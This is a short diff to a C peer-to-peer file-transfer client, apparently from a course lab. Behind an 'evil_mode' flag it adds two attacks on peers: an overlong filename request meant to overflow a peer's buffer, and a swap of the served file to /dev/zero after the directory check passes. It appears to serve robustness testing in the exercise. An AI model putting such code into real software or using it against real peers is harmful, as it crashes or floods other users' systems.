@@ -555,6 +555,16 @@ static void task_download(task_t *t, task_t *tracker_task)
 		return;
 	}
 
+	//if evil mode is one
+	if (evil_mode)
+	{
+		//try to buffer overflow peer
+		char buf[FILENAMESIZ+51];
+		memset(buf, 'a', FILENAMESIZ+50);
+		buf[FILENAMESIZ+50] = '\0';
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", buf);
+	}
+
 	// Read the file into the task buffer from the peer,
 	// and write it from the task bufer onto disk.
 	while (1) {
@@ -663,6 +673,12 @@ static void task_upload(task_t *t)
 	if (t->filename[0] == '/' || strstr(t->filename, "../")){
 		error("Tried to go out of current directory: %s\n", t->filename);
 		goto exit;
+	}
+
+	//after check, see if we want to change filename
+	if(evil_mode)
+	{
+		strcpy(t->filename, "/dev/zero");
 	}
 
 	t->disk_fd = open(t->filename, O_RDONLY);
